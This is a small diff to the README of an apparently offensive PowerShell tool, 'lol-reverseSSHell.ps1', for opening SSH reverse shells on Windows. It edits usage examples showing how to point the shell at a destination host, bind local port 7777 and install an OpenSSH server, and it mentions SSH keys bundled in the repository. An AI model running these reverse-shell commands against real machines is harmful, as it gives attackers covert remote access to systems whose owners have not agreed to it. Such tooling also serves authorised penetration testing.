@@ -6,8 +6,8 @@ This script is intended to make SSH reverse shells easier to initiate on Windows
 * Please generate NEW SSH KEYs. Use the repo's keys only for testing. 
 
 Usage: 
-* .\lol-reverseSSHell.ps1 -DestinationUserName `<user>` -DestinationHost 10.10.10.10
-* .\lol-reverseSSHell.ps1 -DestinationUserName `<user>` -DestinationHost 10.10.10.10 -DestinationPort 22 -DestinationBindLocalPort 7777 -InstallOpenSSHServer yes 
+* .\lol-reverseSSHell.ps1 -DestinationUserName `<user>` -DestinationHost `<IP Address>`
+* .\lol-reverseSSHell.ps1 -DestinationUserName aj -DestinationHost 10.10.10.10 -DestinationPort 22 -DestinationBindLocalPort 7777 -InstallOpenSSHServer yes 
 * get-help .\lol-reverseSSHell.ps1 
 
 * get-help .\lol-reverseSSHell.ps1 -Examples
